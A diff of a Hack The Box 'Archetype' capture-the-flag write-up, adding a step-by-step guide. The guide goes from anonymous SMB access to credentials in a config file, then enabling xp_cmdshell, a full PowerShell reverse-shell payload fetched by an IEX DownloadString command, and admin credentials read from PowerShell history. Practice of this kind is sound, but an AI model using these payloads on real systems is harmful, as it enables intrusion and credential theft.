@@ -7,6 +7,43 @@ I am going to have a quick night of attempting the "Starting Point" machines in 
 
 ---
 
+# The Short Version
+<ol>
+	<li>Enumerate ports via `nmap -sC -sV 10.10.10.27`.  Optionally add the `archetype` machine to your `/etc/hosts` file for a nicer way of referencing this machine.</li>
+    <li>Run `smbclient -N -L \\\\10.10.10.27\\` to list the directories in the samba storage.  Notice `backups` is open access;</li>
+    <li>Run `smbclient -N \\\\10.10.10.27\\backups` to peek inside the `backups` directory.  Notice the `prod.dtsConfig` file inside;</li>
+    <li>Get the `prod.dtsConfig` by running `get prod.dtsConfig` in the samba client;</li>
+    <li>In your own shell, now run `cat prod.dtsConfig | awk -F'User ID=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"` to get the username, and `cat prod.dtsConfig | awk -F'Password=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"` to get the password;</li>
+    <li>Ensure you have Impacket's tools: `git clone https://github.com/SecureAuthCorp/impacket`;</li>
+    <li>We can access the `mssql` server using Impacket's `mssqlclient` tool: `python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`.  Notice here the use of the username from two steps ago.  When prompted, enter the password obtained from two steps ago;</li>
+    <li>
+		Now that you are logged in as `sql_svc`, we can run the following series of SQL commands to access the command shell:
+		```sql
+		sp_configure 'show advanced options', '1'
+		RECONFIGURE
+		sp_configure 'xp_cmdshell', '1'
+		RECONFIGURE -- ;
+		```
+	</li>
+    <li>We need to note down your `tun0` IP.  On your computer, run: `ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'`;</li>
+	<li>
+		We need to put the following into a `shell.ps1` file on your computer:
+		```ps
+		$client = New-Object System.Net.Sockets.TCPClient("10.10.14.34", 1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close()
+		```
+	Notice that we have your `tun0` IP, with some port number (here we have chosen `1234`) near the start of the file;
+	</li>
+    <li>On your computer, we need to set up an http server for later; run `sudo python3 -m http.server 80`.  Ensure you run this in the same directory as your reverse powershell script from the previous step;</li>
+    <li>Also on your computer, we will need a netcat listener; run `nc -nvlp 1234` (or exchange `1234` with the port you chose two steps ago.  Note that in the verbatim version, I used this along with `rlwrap` to make this step nicer);</li>
+    <li>Back in the SQL window, now run `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.34/shell.ps1\");"` in order to transfer the reverse powershell script to the SQL database;</li>
+    <li>Go back to you netcat listener window, and you will see that it has connected to the server!  You can verify this by running `whoami`.  You can now run `more \users\sql_svc\desktop\user.txt` to capture the user flag!;</li>
+    <li>This privilege escalation is simple: it only relies on the powershell history file, which requires no higher rights to acces.  Simply run: `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` and you will see a username and a password;</li>
+    <li>Going back to your computer, we now need to log into the `administrator` user.  We can do this using another one of Impacket's scripts: `psexec.py`: `python3 impacket/examples/psexec.py administrator@archetype`.  Enter the password found in the previous step when prompted;</li>
+	<li>Now you are logged into the administrator, you can capture the root flat: `more \users\administrator\desktop\root.txt`, and you are finished!</li>
+</ol>
+
+# The Long (Verbatim) Version
+
 We enumerate the ports:
 ```
 $ bash common/nmap.sh archetype                                                         
@@ -447,7 +484,7 @@ connect to [10.10.14.34] from (UNKNOWN) [10.10.10.27] 49683
 whoami
 archetype\sql_svc
 more \users\sql_svc\desktop\user.txt
-3e7b102e78218e935bf3f4951fec21a3
+3e7b************************21a3
 ```
 
 Now we have the user flag!  But as far as I can tell, `archetype\sql_svc` is an ordinary user.  We need to escalate privileges.  I follow a good article [here](https://github.com/frizb/Windows-Privilege-Escalation) on privilege escalation in Windows.  Here is some basic data about the user and the system:
@@ -569,5 +606,9 @@ And it looks like we are now accessing the root user!!
 We go to their desktop and find the root flag.  Hurrah!
 ```ps
 C:\Windows\system32>more \users\administrator\desktop\root.txt
-b91ccec3305e98240082d4474b848528
+b91c************************8528
 ```
+
+# Notes
+
+I must admit, I know this is supposed to be the easiest one, made even by the person who created HTB (I believe), but without an HTTP server I must admit I struggled a bit, as I had only experience with HTTP servers.  And naturally, it's always a bit of a struggle to escalate privileges, as there are some pretty niche footholds to do so out there...  And a lot.  Either way, this was a fun experience.
